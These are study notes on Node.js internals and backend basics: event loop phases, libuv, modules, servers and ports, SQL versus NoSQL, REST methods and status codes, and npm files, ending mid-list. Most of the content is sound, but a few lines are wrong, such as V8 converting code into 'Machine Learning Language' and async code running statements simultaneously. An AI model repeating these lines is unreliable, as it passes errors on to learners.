# Nodejs Notes

### What is nodejs?

- Nodejs is an open-source, cross-platform Javscript runtime environment that can run on windows, macOS, Linux and much more.
- Nodejs runs on V8 Javscript engine and executes JS code outside of web browser.

### Importance of JS Engine?

- Wherever is javascript there will be a javascript engine. Without JS engine, JS code cannot be executed.

### What is server?

- A Server is computer(physical or virtual) that works remotely and provides services to other computers.
- Running a website on a server means hosting the website/app on another computer(physical server or cloud infrastructure).
- A server listens for a requests coming from clients
- It processes those requests and sends appropriate responses.
- Multiple clients can communicate with the same server simultaneously.
- **_ A server is not necessarily a physical computer. It can also be a virtual machine running on a physical computer _**

### What is V8?

- V8 is a google's open source high-performance JS Engine written C++.
- V8 can be embedded into any C++ application.
- Job of V8 is Execute Javascript Code
- JS code ------> V8 (read by C++) --------> Converted to Machine Learning Language

### What is ECMAScript?

- ECMAScript is a standard which is followed by Javascript.

### What is NODE.JS now?

- Node.js is a C++ application with V8 embedded into it

### If JS Engine able to execute JS code why do we need Nodejs?

- A JavaScript engine (V8) is responsible for executing JavaScript code.
- Node.js provide a runtime environment with additional API's and capabilites to execute Javascript outside browser.
- These API's allows Javascript to interact with the filesystem, network, HTTP servers, databases through libraries...

- ## V8 = Executes Javascript
- ## Nodejs = Provides runtime environment and additional capabilities (V8 + API's + Components)

### JS Engine and JS Runtime Environment

- JS Engine - executes Javascript (V8)
- JS Runtime - Provides an environment to execute javascript

### Why do we need NodeJS?

- It provides env for execute JS
- Importantly if we want to execute JS without using browser we need NodeJS

### Node REPL

- REPL means Read Evaluate Print Loop
- REPL is a simple, interactive computer programming environment that takes single user inputs, executes them, and returns the result to the user.

### What is NPM?

- NPM is a package manager for Node.js packages, or modules if you like.

### What is package manager?

- A package manager is a collection of software tools that automates the process of installing, upgrading
  , configuring, and removing computer programs for a computer's operating system in a consistent manner.

### What is package?

- A package is a collection of files and folders that are bundled together to provide specific functionality or features to a software application.
- In the context of Node.js, a package is typically a module or library that can be installed and used in a Node.js application.
- Packages can include code, configuration files, documentation, and other resources that are necessary for the package to function properly. Packages can be published to a package registry, such as npm, and can be installed and used by other developers in their own applications.
- Packages can be created by anyone and can be open-source or proprietary.

### global and globalThis

- `global` is an object that provides a way to access global variables and functions
- `globalThis` is a standardized way to access the global object in JavaScript, regardless of the environment (browser or Node.js). It was introduced in ECMAScript 2020 and provides a consistent way to access the global object across different JavaScript environments.

## MODULE.EXPORTS and REQUIRE

### what is module?

- A module is a reusable block of code that encapsulates related functionality and can be imported and used in other parts of an application.

### what is require?

- `require` is a built-in function in Node.js that allows you to import modules
- modules are protects thier properties and methods from being accessed by other modules.
- If we want to use a module properties in another module we need to export those using `module.exports` and import them using `require`.

### what is module.exports?

- It is an empty object by default. We can assign any value to it and that value will be exported from the module.
- `module.exports` is a special object in Node.js that is used to define what a module exports and makes available to other modules that require it.
- It allows you to define the public API of a module, which can include functions, objects, or any other values that you want to expose to other modules.
- When another module requires your module, it will receive the value assigned to `module.exports`, which can then be used in that module.

### commonjs(cjs) and es modules(mjs)

- CommonJS (CJS) is a module system used in Node.js that allows you to define and export modules using the `module.exports` syntax.
- It is synchronous and designed for server-side applications.
- non-strict mode

- ES Modules (ESM) is a module system introduced in ECMAScript 2015 (ES6) that allows you to define and export modules using the `export` and `import` syntax.
- It is asynchronous and designed for both client-side and server-side applications.
- strict mode

### What happens when we require a module?

- All the code inside the module is wrapped inside a function(IIFE)
- Because of this all the variables and functions defined inside a module are scoped to that module and are not accessible outside of it.

### What is IIFE?

- IIFE stands for Immediately Invoked Function Expression. It is a JavaScript function that is defined and immediately executed.
- Keeps the variables and functions defined inside it scoped to that function and not accessible outside of it.

### How are variables and functions are private in different modules?

- Because of IIFE all the variables and functions defined inside a module are scoped to that module.

### How do you get access to module.exports?

- Nodejs passes the module.exports object as an argument to the IIFE and we can access it inside the module using `module.exports` or `exports` variable.

### 5 steps mechanism of require('/path/to/module')

-   1. Resolving the module path - localpath. json, or node:module
-   2. Loading the module - file content is loading based on file type (.js, .json, .node)
-   3. Wrapping the module code inside IIFE - (function(exports, require, module, **filename, **dirname) { // module code })
-   4. Executing the module code - the code inside the IIFE is executed and the module.exports object is populated with the exported values and returned to the caller.
-   5. Caching the module - the module.exports object is cached and returned to the caller. If the same module is required again, the cached version is returned instead of re-executing the module code.

### How async/await works

- An async function always returns a Promise.
- When called, it runs synchronously until the first `await`.
- At `await`:
    - The function pauses; control returns to the caller, and the code after the call continues.
    - The awaited operation (file/DB/network) runs in the background (libuv / OS).
- When the awaited Promise resolves, the rest of the function is queued as a Promise microtask.
- When the call stack is empty, the event loop runs that microtask and the function resumes after the `await`.
- `await` pauses only that function, not the whole program.
- async/await is syntax over Promises: `await x` works like `x.then(rest of the function)`.

### What is a Promise?

- A Promise is an object representing a value that will be available later (success) or an error (failure).
- States:
    - pending → still waiting
    - fulfilled → success, has a value
    - rejected → failed, has an error
    - Once fulfilled or rejected, it never changes.
- Creating: `new Promise((resolve, reject) => { ... })`
    - The executor function runs immediately (synchronously).
    - Call resolve(value) for success, reject(error) for failure.
- Using:
    - .then(fn) → runs on success
    - .catch(fn) → runs on failure
    - .finally(fn) → runs either way
- .then/.catch callbacks are always queued as Promise microtasks, never run synchronously, even if the Promise is already resolved.
- Chaining: each .then() returns a new Promise; one .catch() at the end handles errors from any step.

### Promise methods

- Promise.all → waits for all; fails if any one fails.
- Promise.allSettled → waits for all; returns every result (success or failure).
- Promise.race → settles with the first one to finish (success or failure).
- Promise.any → resolves with the first success; fails only if all fail.

### Promise vs async/await

- async/await is cleaner syntax over Promises.
- .then() ↔ await, .catch() ↔ try/catch

## LIBUV & ASYNC IO

### Difference between synchronous and asynchronous programming?

- Synchronous programming is a programming paradigm where the code is executed sequentially, one statement at a time.
- Each statement must complete before the next one can begin, which can lead to blocking and delays in the execution of the program.
- In synchronous programming, if a statement takes a long time to execute, it can block the execution of the entire program, leading to poor performance and responsiveness.

- Asynchronous programming, on the other hand, is a programming paradigm where the code can be executed concurrently, allowing multiple statements to be executed at the same time.
- In asynchronous programming, when a statement is executed, it can continue to execute other statements while waiting for the result of the first statement to be returned.
- This allows for non-blocking and more efficient execution of code, as it can handle multiple tasks simultaneously without waiting for each one to complete before moving on to the next.
- Asynchronous programming is often used in situations where I/O operations are involved, such as reading from a file or making a network request, as these operations can take a long time to complete and can block the execution of the program if done synchronously.

### How JSEngine works?

- JSEngine is single threaded and it can only execute one task at a time.
- It has a call stack, memory heap, garbage collector and event loop.
- Call stack - is responsible for code execution. It keeps track of the function calls and their execution context.
- Memory heap - is responsible for memory allocation. It keeps track of the memory used by the program and frees up memory that is no longer needed.
- Garbage collector - is responsible for cleaning up memory that is no longer needed. It runs periodically and frees up memory that is no longer referenced by the program.
- Event loop - is responsible for handling asynchronous tasks. It keeps track of the tasks that are waiting to be executed and executes them when the call stack is empty.

### How does JSEngine handle asynchronous tasks?

- When an asynchronous task is encountered, it is offloaded to the event loop, which handles the task in the background.

### What is libuv?

- It provides an event-driven architecture and a thread pool, which allows Node.js to perform non-blocking I/O operations.

#### How does libuv work?

- When an asynchronous task is encountered, it is offloaded to the libuv thread pool, which handles the task in the background.
- Once the task is complete, libuv notifies the event loop, which then executes the callback function associated with the task.

### What is non-blocking I/O?

- Non-blocking I/O is a programming paradigm that allows a program to initiate an I/O operation and continue executing other code while waiting for the I/O operation to complete.
- In non-blocking I/O, the program does not wait for the I/O operation to complete before moving on to the next task. Instead, it registers a callback function that will be executed when the I/O operation is complete. This allows for more efficient use of system resources and can improve the performance of applications that require I/O operations, such as web servers or database applications. Non-blocking I/O is often used in event-driven programming models, where multiple tasks can be executed concurrently without blocking the main thread of execution.

### Difference between fs.readFileSync() and fs.readFile()

- `fs.readFileSync()` is a synchronous method that reads the contents of a file and returns the data as a buffer or string.
- It blocks the execution of the program until the file is read completely, which can lead to performance issues if the file is large or if there are many concurrent requests.

- `fs.readFile()` is an asynchronous method that reads the contents of a file and returns the data through a callback function.
- It does not block the execution of the program and allows other code to run while the file is being read. This can improve the performance of applications that require I/O operations, as it allows for more efficient use of system resources and can handle multiple requests concurrently.

## **\*** SYNCHRONOUS FUNCTIONS WILL BLOCK THE MAIN THREAD **\***

### Types of programming languages

- #### Compiled Languages
    - Code translated into machine code before execution
    - Initialy heavy but faster execution
    - Examples: C, C++, Rust, Go, Java, Kotlin, Swift
- #### Interpreted Languages
    - Code executed line by line at runtime
    - Fast to start but slower execution
    - Examples: Python, Ruby, PHP
- #### Just-In-Time (JIT) Compiled Languages
    - Code compiled into machine code at runtime, just before execution
    - Examples: JavaScript (V8 engine), Java (HotSpot JVM), C# (CLR)

### Javascript is compiled or interpreted?

- Javascript is a Just-In-Time (JIT) compiled language.
- AST generated from the source code
- Then the AST given to Ignition interpreter which generates bytecode
- From the AST if any code is hot(can optimized) then it is given to TurboFan compiler which generates optimized machine code.
- Execution of the code
- TurboFan compiler makes assumptions about the code and optimize it, but if the assumptions are wrong then it deoptimizes the code and gives it back to Ignition interpreter which generates bytecode again.
- In case of Interpreted languages, the code is executed line by line at runtime, while in compiled languages, the code is translated into machine code before execution.

## EVENT LOOP

### What is event loop?

- Event loop is a mechanism that coordinates the execution of synchronous code and asynchronous callbacks.
- It allows Node.js to perform non-blocking I/O operations by offloading tasks to the event loop and executing them when the call stack is empty.
- JavaScript executes code on single main thread, event loop helps it to handle async operations without blocking the main thread.

### How event loop works differently in browser and nodejs?

- Both use event loop to hanlde async operations, but they have different implementations and APIs.
- In browser, event loop is implemented by the browser itself and it uses the Web APIs provided by the browser to handle async operations. The event loop in the browser is responsible for handling user interactions, rendering, and other browser-specific tasks.
- In Node.js, event loop is implemented by the libuv library and it uses the Node.js APIs to handle async operations. The event loop in Node.js is responsible for handling I/O operations, timers, and other Node.js-specific tasks.

### What is callstack?

- Call stack is a data structure that keeps track of functions currently being executed in a program.
- It follows LIFO (Last In First Out) principle, where the last function called is the first one to be executed.
- When a function is called, it is added to the top of the call stack
- When the function completes its execution, it is removed from the top of the call stack.

### How event loop works in browser?

- The event loop in the browser is responsible for handling asynchronous tasks and executing them when the call stack is empty.
- When running a program if any async task is encountered, it is offloaded to the Web APIs provided by the browser, which handles the task in the background.
- Once the task is complete, the Web APIs notify the event loop, which then executes the callback function associated with the task.
- The event loop continuously checks the call stack and the task queue
- If the call stack is empty, it takes the first task from the task queue and pushes it onto the call stack for execution.
- This process continues until all tasks in the task queue have been executed.
- There are two types of task queues in the browser: the macro task queue and the micro task queue.
- The macro task queue is used for tasks that are scheduled to run after the current event loop iteration, such as setTimeout and setInterval callbacks.
- The micro task queue is used for tasks that are scheduled to run before the next event loop iteration, such as Promise callbacks and MutationObserver callbacks.

### How event loop works in nodejs?

- The event loop in Node.js is responsible for handling asynchronous tasks and executing their callbacks when the call stack is empty.
- When running a program, any async task encountered is offloaded to libuv.
- Network I/O is handled by the OS's async mechanisms (epoll/kqueue/IOCP), while fs, dns.lookup, crypto and zlib run on libuv's thread pool (default 4 threads).
- Timers are tracked by libuv itself.
- First, the main script runs synchronously to completion.
- Then, before the event loop starts, the microtask queues are drained: the process.nextTick() queue first, then the Promise queue.
- The event loop has 6 phases: timers, pending callbacks, idle/prepare (internal), poll, check and close callbacks.
- In the timers phase, it executes callbacks of expired setTimeout() and setInterval() timers.
- In the pending callbacks phase, it executes I/O callbacks deferred from the previous loop iteration (e.g. some TCP errors).
- In the poll phase, it retrieves new I/O events and executes their callbacks. If there are none, it waits for new events, but only if no setImmediate() is queued and no timer is due. Otherwise it moves on (or waits only until the nearest timer expires).
- In the check phase, it executes callbacks scheduled by setImmediate().
- In the close phase, it executes close callbacks, e.g. socket.on('close').
- Since Node 11, after every individual callback in any phase, the process.nextTick() queue is drained fully, followed by the Promise queue. process.nextTick() always has priority over Promises.
- This process continues until there are no active ref'd handles or requests left (timers, sockets, servers, pending fs operations). Calling unref() on a handle stops it from keeping the loop alive.

### What happens when callstack and event loop are empty?

- If there are still pending tasks (active server, pending timers, ongoing I/O like file reads or DB queries):
    - The event loop waits in the poll phase for new events.
    - If a timer is pending, it waits only until that timer is due, then goes to the timers phase.
- If nothing is pending (no active handles or requests):
    - The event loop stops and the Node.js process exits.
    - Before exiting, Node emits the 'beforeExit' event, then the 'exit' event.
- Example: an HTTP server never exits because it keeps listening for requests. A script with only console.log exits immediately.

### What is process.nextTick()?

- `process.nextTick(fn)` is a method in Node.js that schedules a callback to run immediately after the current code (the sync code running right now) finishes, before the event loop continues.
- It runs before Promise callbacks, timers (setTimeout), setImmediate and I/O callbacks.

#### Use

- To let the caller finish its setup before your code runs, e.g. emitting an event from a constructor after listeners are attached:
  `process.nextTick(() => this.emit('ready'))`
- To make a function always async, so callers get predictable ordering.

#### Caution

- Calling nextTick recursively blocks the event loop, so I/O and timers never run.
- For general use, prefer Promises / queueMicrotask(). Use setImmediate() to yield to I/O.

### What is setImmediate()?

- `setImmediate(fn)` is a method in Node.js that schedules a callback to run in the check phase of the event loop, which comes right after the poll (I/O) phase.
- It runs after the current code, nextTick and Promise callbacks finish.

## **_ After every callback, Node executes the nextTick queue, then the Promise queue, before running the next callback _**

# HOW ASYNC TASKS ARE HANDLED

- When an async task is encountered:
    - process.nextTick() → goes to the nextTick queue (runs first).
    - Promises → go to the Promise (microtask) queue (runs after the nextTick queue).
    - setTimeout(), setInterval() and setImmediate() → libuv tracks them and executes their callbacks in the appropriate phase (timers / check).
    - fs, dns.lookup, crypto and zlib → libuv offloads them to its thread pool. A thread does the work (asks the OS to do it, or does it itself), then libuv schedules the callback to run in the poll phase.
    - Network I/O → handled by the OS's async mechanisms (epoll/kqueue/IOCP), so no thread pool is needed. The OS notifies libuv when data arrives, and the callback runs in the poll phase.
- Once the task is done, its callback is added to the queue of its phase.
- The event loop picks up the callback and executes it on the main thread when the call stack is empty.

### What is a thread pool?

- A thread pool is a fixed set of pre-created threads that are reused to perform tasks concurrently, instead of creating a new thread for every task.
- If all threads are busy, new tasks wait in a queue until a thread is free.
- By default, libuv's thread pool has 4 threads.
- The size can be changed:
    - When starting Node (recommended): `UV_THREADPOOL_SIZE=8 node app.js`
    - In code: `process.env.UV_THREADPOOL_SIZE = 8;` (only works at the very top of the entry file, before any fs/crypto/zlib/dns call)

### Is nodejs single threaded or multi-threaded?

- It depends
- Node.js is single-threaded for executing JavaScript code (the main thread),
- but it uses a multi-threaded architecture for handling asynchronous I/O operations through libuv's thread pool and the OS's async mechanisms.

# **\*\*** SERVER **\*\***

### Difference between software and application?

- Software is a general term that refers to any set of instructions or programs that tell a computer how to perform specific tasks. It can include operating systems, utilities, and applications.
- An application, on the other hand, is a specific type of software that is designed to perform a particular function or set of functions for the user. Applications are typically more focused and user-oriented, providing a specific service or functionality, such as word processing, web browsing, or gaming.
- Examples for software: Operating systems (Windows, macOS, Linux), Utilities (antivirus software, disk cleanup tools), Programming languages and compilers (Python, Java, C++)
- Examples for application: Web browsers (Google Chrome, Mozilla Firefox), Office suites (Microsoft Office, Google Workspace), Media players (VLC Media Player, Spotify), Games (Fortnite, Minecraft)

### What is a server?

- A server is something that serves data or services to others (clients) over a network.
- The term refers to two things:
    - Hardware: a machine (physical or virtual/cloud) with CPU, RAM and storage (SSD/HDD) that runs 24/7.
    - Software: a program running on that machine that listens for requests and sends responses.

### Client-server model

- Client = the one who ASKS (sends a request). Example: browser, mobile app, Postman.
- Server = the one who ANSWERS (receives the request, processes it and sends a response). Example: a backend app returning data.
- Client and server are roles, not machine types: the same app can be a server for one request and a client for another (e.g. a backend answers a mobile app as a server, but acts as a client when it calls the database or a payment API).

### Real example: ordering food on Swiggy

1. You open the Swiggy app and tap "Show restaurants near me" → the app (client) sends a request.
2. The request goes to https://api.swiggy.com/restaurants over HTTPS.
3. DNS converts api.swiggy.com into an IP address.
4. The request reaches Swiggy's machine (server hardware) on port 443.
5. Nginx (web server) receives it and forwards it to the app server.
6. The app server (backend code) runs the logic: find restaurants near this location.
7. The app server asks the database server for the data (here the app server acts as a client).
8. The database returns the data; the app server sends it back as a JSON response.
9. The Swiggy app shows the restaurant list.

Flow: Swiggy app (client) → DNS → Nginx (web server) → App server → Database → response back to app

### How clients reach a server

- Clients reach a server using IP address + port (e.g. 192.168.1.10:3000).
- Domain names (e.g. swiggy.com) are converted to IP addresses by DNS.
- Server software listens on a port (e.g. 80 for HTTP, 443 for HTTPS, 3000 for local dev).
- Client and server communicate using a protocol, commonly HTTP/HTTPS.

### Examples

- Server software: Nginx, Apache, or a Node.js program using http.createServer / Express (Node.js itself is a runtime, not a server).
- Types of servers: web server (Nginx, Apache), application server (Node.js app), database server (MySQL, MongoDB), file server, mail server.
- Any computer can act as a server; running `node app.js` on your laptop makes it a server if the app listens on a port.

### Who is a client?

- A client is a program or device that sends a request to a server and waits for a response. Example: browser, mobile app, Postman.
- When a client sends a request to a server:
    - A socket connection is created between them.
    - The server processes the request and sends the response back.
    - The connection is closed, or kept open and reused for more requests (HTTP keep-alive).
- The socket uses TCP/IP to send and receive data.

### Protocol

- A protocol is a set of rules for how data is sent and received: a common language that both client and server understand.

### TCP/IP

- IP (Internet Protocol): gives every device an address and routes data to the right device.
    - Devices on a home/office network have private IPs (e.g. 192.168.1.5) and share one public IP through the router.
- TCP (Transmission Control Protocol): splits data into packets and delivers them reliably and in order. Lost packets are resent.
- TCP/IP only moves data between devices. It does not know what the data means.

### Application protocols (HTTP, FTP, SMTP)

- Since TCP/IP only carries data, client and server need another set of rules to understand the data. These are application protocols.
- They run on top of TCP/IP:
    - IP → finds the device (address)
    - TCP → delivers the data reliably
    - HTTP / FTP / SMTP → defines what the data means
- Analogy: TCP/IP is the phone line; HTTP/FTP/SMTP is the language spoken on the call. Both sides must speak the same language.
- Each protocol is designed for a specific job:
    - HTTP (port 80) / HTTPS (port 443): websites and APIs (GET, POST, status codes like 200, 404)
    - FTP (port 21): file transfer (login, upload, download)
    - SMTP (port 25 / 587): sending emails (sender, receiver, message)
- Example HTTP request sent over TCP:
  GET /restaurants HTTP/1.1
  Host: api.swiggy.com

### DNS (Domain Name System)

- Computers find each other using IP addresses (e.g. 142.250.183.14), but humans use names like swiggy.com or google.com.
- DNS is a system that translates domain names (like google.com) into IP addresses (like 142.250.183.14).
- Analogy: like the contacts app on your phone. You tap a name, and the phone looks up the number and dials it.

### PORT

- We can run multiple servers on the same machine, but each server must listen on a different port.
- Port number is used to differentiate between multiple services running on the same machine.
- IP address finds the machine; port finds the application on that machine.
    - Analogy: IP = building address, port = flat number.
- Port range: 0 – 65535 (0 – 1023 are reserved for well-known services).
- Common ports:
    - 80 → HTTP (websites)
    - 443 → HTTPS (secure websites)
    - 21 → FTP (file transfer)
    - 22 → SSH (remote login)
    - 25 → SMTP (sending emails)
    - 3306 → MySQL
- Example: a machine with IP 192.168.1.2
    - Nginx listening on port 80 → client sends request to http://192.168.1.2:80
    - Node.js server listening on port 3000 → client sends request to http://192.168.1.2:3000
    - MySQL listening on port 3306 → app connects to 192.168.1.2:3306
- Browsers add default ports automatically: http → 80, https → 443. So https://google.com is actually https://google.com:443.
- If two servers try to use the same port, the second one fails with: EADDRINUSE (address already in use).

### What is a web server?

- A web server is a software that listens for HTTP requests on a specific port (usually 80 or 443) and responds with HTTP responses, usually serving web pages or APIs.
- Examples: Nginx, Apache, Node.js with Express.
- A web server can serve static files (HTML, CSS, JS) or dynamic content generated by server-side code (Node.js, Python, PHP, etc.).
- A web server can also act as a reverse proxy, forwarding requests to other servers or services, and can handle load balancing, caching, and security features like SSL/TLS.

# DATABASE

### What is a database?

- A database is a structured collection of data that is stored and managed in a way that allows for efficient retrieval, manipulation, and organization of that data.
- The software that manages a database is called a DBMS (Database Management System). Example: MySQL is a DBMS.

### Types of databases

- Relational Databases (SQL): store data in tables with rows and columns, and use Structured Query Language (SQL) for querying and managing the data. Examples: MySQL, PostgreSQL, Oracle Database, Microsoft SQL Server.
- Non-relational Databases (NoSQL): store data in a variety of formats, such as key-value pairs, documents, graphs, or wide-column stores, and do not require a fixed schema. Examples: MongoDB, Cassandra, Redis, Couchbase.

### Difference between SQL and NoSQL Databases

- SQL Databases:
    - Use structured tables with rows and columns.
    - Enforce a fixed schema, meaning the structure of the data must be defined before inserting data.
    - Use SQL for querying and managing data.
    - Related data is stored in separate tables and connected using keys (JOINs).
    - Support ACID (Atomicity, Consistency, Isolation, Durability) transactions.
    - Mostly scale vertically (add more CPU/RAM to one server).
    - Examples: MySQL, PostgreSQL, Oracle Database, Microsoft SQL Server.
- NoSQL Databases:
    - Store data in flexible formats: documents, key-value pairs, graphs or wide-columns.
    - Have a flexible schema: each record can have different fields, and the structure can change anytime.
    - Use their own query methods (e.g. MongoDB uses JSON-like queries), not standard SQL.
    - Related data is often stored together in one record, so fewer joins are needed.
    - Many favor availability and speed over strict consistency (eventual consistency), though some (like MongoDB) also support ACID transactions.
    - Designed to scale horizontally (add more servers).
    - Examples: MongoDB, Cassandra, Redis, Couchbase.

### Types of NoSQL databases

- Document: stores JSON-like documents → MongoDB, Couchbase
- Key-Value: stores simple key → value pairs, very fast → Redis
- Wide-Column: stores data in flexible columns, handles huge data → Cassandra
- Graph: stores nodes and relationships → Neo4j

### When to use which

- SQL: data with clear structure and relationships, where accuracy is critical. Example: banking, orders, payments, inventory.
- NoSQL: flexible or fast-changing data, huge scale, high speed. Example: chat messages, logs, caching (Redis), real-time analytics, product catalogs.

### MongoDB

- MongoDB is a NoSQL, document-based database.
- Data stored in collectiosn in the form of documents
- Stores data as documents in a JSON-like format. Internally it uses BSON (Binary JSON), which is faster and supports extra types like Date and ObjectId.

### Key terms (SQL → MongoDB)

- Table → Collection
- Row → Document
- Column → Field
- Primary key → \_id (auto-generated for each document)

### Features

- Flexible schema: documents in the same collection can have different fields, and the structure can change anytime without migrations.
- Supports nested objects and arrays inside a document, so related data can be stored together (fewer joins).
- Very compatible with the JS stack: data looks like JS objects, so no conversion is needed. Commonly used in the MERN stack (MongoDB, Express, React, Node).
- Scales horizontally using sharding (data split across multiple servers).
- High availability using replica sets (copies of data on multiple servers; if one fails, another takes over).
- Supports ACID transactions (multi-document transactions since v4.0).
- In Node.js, commonly used with Mongoose (an ODM that adds schemas and validation).

### Basic queries

- Insert: db.users.insertOne({ name: "Sakthi", city: "Hosur" })
- Find: db.users.find({ city: "Hosur" })
- Update: db.users.updateOne({ name: "Sakthi" }, { $set: { city: "Bengaluru" } })
- Delete: db.users.deleteOne({ name: "Sakthi" })

# MONOLITH VS MICROSERVICES

### What is monolithic architecture?

- Monolithic architecture is a traditional software design approach where all the components of an application are built as a single, tightly integrated unit.
- In a monolithic application, the user interface, business logic and data access layers are combined into a single codebase and deployed as a single executable or package.
- Monolithic applications are typically easier to develop and deploy initially, but can become difficult to maintain and scale as the application grows in size and complexity.
- In simple Monolith means frontend and backend are tightly coupled and deployed together.

### What is microservices architecture?

- Microservices architecture is a modern software design approach where an application is built as a collection of small, independent services that communicate with each other over a network.
- Each microservice is responsible for a specific business capability and can be developed, deployed and scaled independently of other services.
- Microservices architecture allows for greater flexibility, scalability and maintainability, as each service can be developed and deployed independently, and can use different programming languages, frameworks and databases as needed.
- In simple Microservices means frontend and backend are loosely coupled and deployed independently (different repositories, different servers, different databases).

# LLD and HLD

### What is HLD?

- HLD stands for High-Level Design.
- It focuses on the overall architecture of a system: the big picture.
- It shows the main components, how they connect and how data flows between them.
- Decides: which services exist, which database type (SQL/NoSQL), caching, load balancing, queues, third-party integrations.
- Includes: system architecture diagrams, data flow diagrams.
- Answers: WHAT are the parts and HOW do they work together?
- Usually done by architects / senior engineers.

### What is LLD?

- LLD stands for Low-Level Design.
- It focuses on the implementation details of each component: a blueprint for developers to write code.
- Defines: classes and methods, DB table schemas (columns, types, relations), API endpoints with request/response, data structures, error handling.
- Includes: class diagrams, sequence diagrams, flowcharts.
- Answers: HOW exactly is each part built?
- Usually done by developers / tech leads.

### HLD vs LLD

- Level: HLD = whole system; LLD = inside each component
- Audience: HLD = architects, stakeholders; LLD = developers
- DB: HLD = choose DB type (MySQL / MongoDB / Redis); LLD = table structure and columns
- API: HLD = which services expose APIs; LLD = exact endpoints, payloads, responses
- Diagrams: HLD = architecture, data flow; LLD = class, sequence, flowchart

### Example: food delivery app

- HLD: Mobile app → Load balancer → Order service, Payment service, Restaurant service; orders stored in MySQL; menu cached in Redis.
- LLD: Order class with placeOrder() / cancelOrder(); orders table (id, user_id, restaurant_id, status, total, created_at); POST /orders API with body { restaurantId, items[] }.

### Which design should we start first?

- Start with HLD first. It gives the big picture of the system and shows how components interact.
- Once the architecture is clear, move to LLD to define the implementation details of each component.
- This ensures implementation decisions align with the overall architecture and project goals.
- In practice it is iterative: LLD can reveal issues that require updating the HLD.

# REST API

### What is REST API?

- REST (Representational State Transfer) is an architectural style for designing networked applications.
- REST APIs let different software systems communicate over HTTP using standard methods (GET, POST, PUT, PATCH, DELETE) and stateless interactions.
- REST APIs use resources (data entities) identified by URLs, and clients perform operations on these resources using HTTP methods.
- REST APIs are widely used for building web services and for communication between frontend and backend applications.

### REST principles (constraints)

- Client-Server: client and server are separate; they communicate only through requests and responses.
- Stateless: each request contains all the information needed (e.g. auth token); the server does not remember previous requests.
- Cacheable: responses can be marked cacheable so clients don't request the same data again.
- Uniform Interface: resources are identified by URLs and accessed using standard HTTP methods.
- Layered System: the client doesn't know if it is talking directly to the server or through a load balancer / proxy / cache.
- Code on Demand (optional): the server can send executable code (e.g. JS) to the client.

### HTTP methods

- GET → Read data → GET /users/1 → Safe, Idempotent
- POST → Create new data → POST /users → Not idempotent (each call creates a new record)
- PUT → Replace entire data → PUT /users/1 → Idempotent
- PATCH → Update some fields → PATCH /users/1 → Not necessarily idempotent
- DELETE → Delete data → DELETE /users/1 → Idempotent
- Safe = does not change data. Idempotent = calling it many times gives the same result as calling it once.

### Common status codes

- 2xx Success: 200 OK, 201 Created, 204 No Content
- 3xx Redirect: 301 Moved Permanently, 304 Not Modified
- 4xx Client error: 400 Bad Request, 401 Unauthorized (not logged in), 403 Forbidden (no permission), 404 Not Found, 409 Conflict, 422 Validation error, 429 Too Many Requests
- 5xx Server error: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable

### URL naming best practices

- Use nouns, not verbs: /users (not /getUsers)
- Use plural names: /users, /orders
- Use nesting for relations: /users/1/orders
- Use query params for filter / sort / pagination: /users?city=Hosur&page=2
- Use versioning: /api/v1/users

### REST API vs SOAP API

- REST API:
    - Architectural style, not a protocol.
    - Uses standard HTTP methods (GET, POST, PUT, PATCH, DELETE).
    - Typically uses JSON for data exchange (can also use XML).
    - Stateless: each request contains all the information needed to process it.
    - Lightweight and easier to use, especially for web and mobile applications.
- SOAP API:
    - Protocol with strict standards.
    - Uses only XML for data exchange.REST
    - Requires a specific message structure (envelope, header, body).
    - Can be stateful or stateless, but often more complex.
    - Heavier; often used in enterprise applications with strict security and transaction requirements (e.g. banking).

### REST API vs GraphQL

- REST API:
    - Uses multiple endpoints for different resources (e.g. /users, /posts).
    - Each endpoint returns a fixed structure of data.
    - Over-fetching (more data than needed) or under-fetching (needing multiple calls) can occur.
    - Caching is straightforward, since each endpoint can be cached independently.
- GraphQL:
    - Uses a single endpoint for all queries and mutations (e.g. /graphql).
    - Clients specify exactly what data they need, reducing over-fetching and under-fetching.
    - Uses a strongly typed schema.
    - More complex to implement and cache, since queries can vary widely.

### Difference between PUT and PATCH

- PUT:
    - Replaces the entire resource with the new data provided in the request.
    - If a field is missing in the request, it is removed or reset to null/default.
    - Idempotent: making the same PUT request multiple times has the same effect as making it once.
    - Example: user = { name: "Sakthi", city: "Hosur" }
      PUT /users/1 { name: "Sakthivel" } → { name: "Sakthivel" } (city removed)
- PATCH:
    - Updates only the specified fields, leaving other fields unchanged.
    - If a field is missing in the request, it is not modified.
    - Not necessarily idempotent: the same PATCH request may give different results when repeated.
    - Example: PATCH /users/1 { name: "Sakthivel" } → { name: "Sakthivel", city: "Hosur" } (city unchanged)
    - Non-idempotent example: PATCH /posts/1 { "likes": "+1" } → likes increases on every call.

### How node_modules work?

- When you run `npm install <package>`, npm downloads the package and its dependencies into the `node_modules` folder in your project.
- Each package can have its own `node_modules` folder for its dependencies, creating a nested structure.
- Node.js uses a module resolution algorithm to find the required module:
    1. It first looks in the `node_modules` folder of the current directory.
    2. If not found, it looks in the `node_modules` folder of the parent directory, and so on, up to the root of the filesystem.
- This allows different projects to have different versions of the same package without conflicts.

### What is package.json?

- `package.json` is a file that contains metadata about a Node.js project, including its name, version, description, main entry point, scripts, dependencies, and more.
- It is used by npm to manage the project's dependencies and scripts.
- Key fields:
    - `name`: The name of the project.
    - `version`: The version of the project.
    - `description`: A brief description of the project.
    - `main`: The entry point of the application (e.g., `index.js`).
    - `scripts`: A set of commands that can be run using `npm run <script>`.
    - `dependencies`: A list of packages required for the project to run.
    - `devDependencies`: A list of packages required only for development (e.g., testing tools, build tools).
    - `engines`: Specifies the versions of Node.js and npm that the project is compatible with.

### What is package-lock.json?

- `package-lock.json` is a file automatically generated by npm that records the exact versions of installed dependencies and their dependencies, ensuring that the same versions are installed in every environment.
- It helps maintain consistency across different machines and deployments, preventing issues caused by version mismatches.
- It includes information such as the resolved version of each package, the package's integrity hash, and the dependency tree.

### Differnce between dependencies and devDependencies?

- `dependencies`: These are the packages required for the application to run in production.
- They are installed when you run `npm install` without any flags.
- Example: Express, Mongoose, Axios.
- `devDependencies`: These are the packages required only for development and testing purposes.
- They are installed when you run `npm install --save-dev` or `npm install -D`.
- Example: Jest, ESLint, Babel, Webpack.

### Versioning in package.json

- Semantic Versioning (SemVer) is used in `package.json` to specify the version of a package.
- A version number is in the format `MAJOR.MINOR.PATCH`
    - MAJOR: Incremented for incompatible API changes.
    - MINOR: Incremented for adding functionality in a backward-compatible manner.
